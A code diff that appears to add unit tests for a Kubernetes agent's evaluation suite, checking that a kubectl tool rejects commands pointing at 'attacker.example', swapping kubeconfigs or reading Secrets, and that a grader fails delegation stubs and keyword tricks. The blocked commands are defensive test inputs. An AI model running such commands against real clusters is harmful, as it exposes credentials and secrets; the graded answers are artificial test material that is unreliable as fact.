@@ -16,6 +16,7 @@
 
 import json
 from pathlib import Path
+import subprocess
 import sys
 import unittest
 
@@ -182,6 +183,163 @@ Please review this /plan before enabling or mutating cluster infrastructure.
         # Mutating exec must be rejected
         res = asyncio.run(tool_fn("kubectl exec -it pod -- bash"))
         self.assertIn("prohibited", res)
+
+        # Connection overrides and Secret reads must be rejected before kubectl runs
+        for cmd in (
+            "kubectl --server=https://attacker.example get pods",
+            "kubectl -s https://attacker.example get pods",
+            "kubectl --kubeconfig /tmp/other get pods",
+            "kubectl get --raw /api/v1/namespaces/default/secrets",
+            "kubectl get secrets -n kubeagents-system -o yaml",
+            "kubectl describe secret/litellm-master-key",
+            "kubectl get configmaps,secrets",
+        ):
+            with self.subTest(cmd=cmd):
+                self.assertIn("prohibited", asyncio.run(tool_fn(cmd)))
+
+    def _score_with_dataset_rules(self, prompt_id, output_text):
+        row = next(s for s in self.samples if s["id"] == prompt_id)
+        return evaluate_response_quality(
+            prompt_id=prompt_id,
+            output_text=output_text,
+            required_keywords=row["required"],
+            forbidden_keywords=row["forbidden"],
+            min_length=row["min_length"],
+        )
+
+    def test_long_delegation_stubs_rejected(self):
+        """Tests that hand-off stubs longer than one short sentence are still rejected."""
+        stubs = {
+            19: "I am checking the platform-agent-gateway container logs now and will report back shortly with the last 5 lines.",
+            11: "Let me check the pods in kubeagents-system and get back to you with the platform-agent status once it is running.",
+            2: "I've asked the cluster agent to look into this and will report back with what the coordinator agent says.",
+            10: "Filed a task with the cluster agent to list every node and whether it is ready; results will appear in this thread.",
+            15: "The cluster agent has the request and I will report back with each service in kubeagents-system when it replies.",
+            # Deferral after the opening sentence, or a verb outside the opening-phrase list.
+            9: "I've sent your request to the cluster agent for this cluster. It will list every namespace, "
+            "including kubeagents-system, and I'll report back when it replies.",
+            14: "The cluster agent is now querying the kube-agents-web-console deployment to confirm it is ready. "
+            "I'll report back shortly.",
+            18: "Your request for Warning events is with the cluster agent. I'll update this thread once it confirms "
+            "which event types fired.",
+            21: "I'll draft a plan for installing agent substrate on this cluster, covering the cluster part and the "
+            "workload part, and send it to you once the cluster agent replies.",
+            # Narrative words ("found", "Active") no longer exempt a stub.
+            16: "I've asked the cluster agent to list each agent CRD in kubeagents-system; I'll report back with what it found.",
+            13: "Let me check which pods are Active in this cluster and whether any restart. I'll report back.",
+        }
+        for prompt_id, text in stubs.items():
+            with self.subTest(prompt_id=prompt_id):
+                self.assertGreater(len(text), 80)
+                passed, msg = self._score_with_dataset_rules(prompt_id, text)
+                self.assertFalse(passed, text)
+                self.assertIn("Delegation stub", msg)
+
+    def test_complete_answer_with_trailing_follow_up_passes(self):
+        """Tests that a complete answer ending with a follow-up offer is not treated as a stub."""
+        passed, msg = self._score_with_dataset_rules(
+            11,
+            "platform-agent-gateway and platform-agent-operator are running in kubeagents-system. "
+            "I will follow up if either pod restarts.",
+        )
+        self.assertTrue(passed, msg)
+
+    def test_complete_answers_pass_dataset_rules(self):
+        """Tests that complete answers using plurals and ordinary vocabulary pass their dataset rules."""
+        answers = {
+            6: "The fleet in project gca-gke-test has 3 GKE clusters: ka-webconsole-pr2321, dev-a and dev-b.",
+            9: "After checking all 14 namespaces: kubeagents-system, kube-system and default are Active.",
+            10: "All 3 nodes report Ready: gke-pool-1-a, gke-pool-1-b and gke-pool-1-c.",
+            16: "Two kube-agents Custom Resource Definitions are installed: platformagents.kubeagents.io "
+            "and clusteragents.kubeagents.io (agent CRDs).",
+            # A conditional follow-up offer, or a "Checking" opening followed by the result list.
+            8: "The cluster is in us-central1 (zones us-central1-a, us-central1-b, us-central1-c); I'll let you know "
+            "if that changes.",
+            11: "Checking kubeagents-system: platform-agent-gateway, platform-agent-operator, and litellm are all running.",
+            13: "No pods are in CrashLoopBackOff and none have restarted in kubeagents-system or kube-system.",
+        }
+        for prompt_id, text in answers.items():
+            with self.subTest(prompt_id=prompt_id):
+                passed, msg = self._score_with_dataset_rules(prompt_id, text)
+                self.assertTrue(passed, msg)
+
+    def test_underscore_identifiers_keep_word_boundaries(self):
+        """Tests that vertex_ai satisfies 'vertex' and model_default trips the 'model-default' check."""
+        passed, msg = self._score_with_dataset_rules(1, "I am running on gemini-3.8-flash through vertex_ai.")
+        self.assertTrue(passed, msg)
+
+        passed, msg = self._score_with_dataset_rules(
+            1, "I am running on gemini-3.8-flash through vertex_ai via the model_default alias."
+        )
+        self.assertFalse(passed)
+        self.assertIn("model-default", msg)
+
+    def test_prompt_1_custom_leak_rejected_with_vertex_present(self):
+        """Tests that the LiteLLM 'custom' provider leak fails prompt 1 even when Vertex is named."""
+        passed, msg = self._score_with_dataset_rules(
+            1, "Model: gemini-3.8-flash. Provider: custom (LiteLLM), routed to Vertex AI."
+        )
+        self.assertFalse(passed)
+        self.assertIn("custom", msg)
+
+    def test_status_negation_forms(self):
+        """Tests that 'No nodes are Ready', 'None of ... are Ready', and 'not-ready' do not satisfy 'ready'."""
+        for text in (
+            "No nodes are Ready: gke-a, gke-b and gke-c all report NotReady.",
+            "None of the 3 nodes are Ready right now.",
+            "Node gke-a is not-ready; node gke-b is not-ready.",
+        ):
+            with self.subTest(text=text):
+                passed, msg = self._score_with_dataset_rules(10, text)
+                self.assertFalse(passed, text)
+                self.assertIn("Missing required keyword", msg)
+
+    def test_prompt_21_requires_whole_words(self):
+        """Tests that 'factor' and 'explanation' do not stand in for 'actor' and 'plan'."""
+        passed, msg = evaluate_response_quality(
+            prompt_id=21,
+            output_text=(
+                "Agent substrate needs its CRDs on the cluster first; the main factor is quota, "
+                "and the explanation for the order is that the operator must exist."
+            ),
+        )
+        self.assertFalse(passed)
+        self.assertIn("Workload part", msg)
+
+    def test_dataset_task_ids_match_manifest(self):
+        """Tests that every dataset record names a task the .evals/list manifest declares, and vice versa."""
+        import kube_agents_tasks
+
+        manifest_path = Path(__file__).resolve().parent.parent / ".evals" / "list"
+        manifest = json.loads(
+            subprocess.run(["sh", str(manifest_path)], capture_output=True, text=True, check=True).stdout
+        )
+        manifest_ids = {t["id"] for t in manifest["tasks"]}
+        dataset_ids = {s["task_id"] for s in self.samples}
+        self.assertEqual(dataset_ids, manifest_ids)
+        for t in manifest["tasks"]:
+            fn_name = t["spec"].split("@", 1)[1]
+            self.assertTrue(callable(getattr(kube_agents_tasks, fn_name, None)), fn_name)
+
+    def test_loader_fails_loudly_on_bad_records(self):
+        """Tests that malformed, incomplete, or unmatched dataset records raise instead of being dropped."""
+        import tempfile
+        from unittest import mock
+
+        import kube_agents_tasks
+
+        cases = {
+            "malformed": '{"id": 1, "task_id": "kubeagents/identity_and_role", "input": \n',
+            "missing key": '{"id": 1, "task_id": "kubeagents/identity_and_role"}\n',
+            "no records": '{"id": 1, "task_id": "kubeagents/identity_and_rol", "input": "x"}\n',
+        }
+        for name, content in cases.items():
+            with self.subTest(case=name), tempfile.TemporaryDirectory() as tmp:
+                path = Path(tmp) / "dataset.jsonl"
+                path.write_text(content, encoding="utf-8")
+                with mock.patch.object(kube_agents_tasks, "DATASET_PATH", path):
+                    with self.assertRaises(ValueError):
+                        kube_agents_tasks._load_samples_for_task("kubeagents/identity_and_role")
 
 
 if __name__ == "__main__":
